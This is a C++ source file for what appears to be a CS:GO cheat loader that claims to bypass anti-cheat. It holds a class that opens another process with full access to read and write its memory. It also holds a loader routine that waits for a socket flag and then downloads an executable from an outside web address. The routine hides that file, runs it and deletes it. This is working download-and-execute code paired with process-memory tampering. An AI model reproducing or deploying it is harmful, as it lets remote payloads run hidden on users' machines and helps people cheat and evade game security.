#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#define dwClientState 0x59F194
#define dwClientState_State  0x108

#include <Windows.h>
#include <urlmon.h>
#include "bypassByte.h"
#include "VBMem.h"
#include "vbypass.h"

#include <filesystem>
#include <functional>
#include <tchar.h>
#include <iostream>

#include <urlmon.h>

#pragma comment (lib,"urlmon.lib")


#include "../socket/msoket.h"
#include "../manualmap/mmap.h"

#pragma comment (lib, "Urlmon.lib")

bool isProcessRunning(LPCSTR pName) 
{
    HWND hwnd;
    hwnd = FindWindow(NULL, pName);
    if (hwnd != 0) {
        return true;
    }
    else {
        return false;
    }
}

class ProcessMemory
{
public:
    ProcessMemory(const std::string& process_name)
    {
        // Bu fonksiyon, belirtilen iþlem adýna göre bir iþlem ID'si döndürür.
        m_process_id = get_process_id(process_name);

        // Bu fonksiyon, belirtilen iþlem ID'sine sahip iþlemin bellek
        // eriþim haklarýný alýr.
        m_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_process_id);
        if (!m_handle) {
            throw std::runtime_error("Failed to open process: " + process_name);
        }
    }

    ~ProcessMemory()
    {
        CloseHandle(m_handle);
    }

    template <typename T>
    T read(DWORD address)
    {
        T value;
        ReadProcessMemory(m_handle, reinterpret_cast<void*>(address), &value, sizeof(T), nullptr);
        return value;
    }

    template <typename T>
    void write(DWORD address, T value)
    {
        WriteProcessMemory(m_handle, reinterpret_cast<void*>(address), &value, sizeof(T), nullptr);
    }

private:
    DWORD get_process_id(const std::string& process_name)
    {
        DWORD process_id = 0;
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 process_entry;
            process_entry.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(snapshot, &process_entry)) {
                do {
                    if (process_name == process_entry.szExeFile) {
                        process_id = process_entry.th32ProcessID;
                        break;
                    }
                } while (Process32Next(snapshot, &process_entry));
            }
            CloseHandle(snapshot);
        }
        return process_id;
    }

public:

    HANDLE m_handle;
    DWORD m_process_id;
};

DWORD dwGetModuleBaseAddress(DWORD dwProcessID, TCHAR* lpszModuleName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID);
    DWORD dwModuleBaseAddress = 0;
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        MODULEENTRY32 ModuleEntry32 = { 0 };
        ModuleEntry32.dwSize = sizeof(MODULEENTRY32);
        if (Module32First(hSnapshot, &ModuleEntry32))
        {
            do
            {
                if (_tcscmp(ModuleEntry32.szModule, lpszModuleName) == 0)
                {
                    dwModuleBaseAddress = (DWORD)ModuleEntry32.modBaseAddr;
                    break;
                }
            } while (Module32Next(hSnapshot, &ModuleEntry32));
        }
        CloseHandle(hSnapshot);
    }
    return dwModuleBaseAddress;
}

void BypassLoader::LoaderLoop(HMODULE hModule)
{
    while (!mSocket::cfg::_____jskjensb)
        Sleep(200);

    DeleteFileA("./xfencerXx.exe");
    std::string FilePath = "./xfencerXx.exe";
    std::string URL = "https://proximitycsgo.com/pnp.php";


    std::wstring tempUrl = std::wstring(URL.begin(), URL.end());
    std::wstring tempPath = std::wstring(FilePath.begin(), FilePath.end());

    // Applying c_str() method on temp
    LPCSTR wideStringUrl = (LPCSTR)tempUrl.c_str();
    LPCSTR wideStringPath = (LPCSTR)tempUrl.c_str();


    if (S_OK == URLDownloadToFileA(NULL, URL.c_str(), "./xfencerXx.exe", 0, NULL))
    {
        const char* file_name = "./xfencerXx.exe";

        if (SetFileAttributesA(file_name, FILE_ATTRIBUTE_HIDDEN)) {
            system("xfencerXx.exe");
        }
        else {
            std::cout << "Hata: " << GetLastError() << std::endl;
        }

        DeleteFileA("./xfencerXx.exe");
    }
    else {
        std::cout << "Error, DWFailed" << std::endl;
    }

    exit(0);
}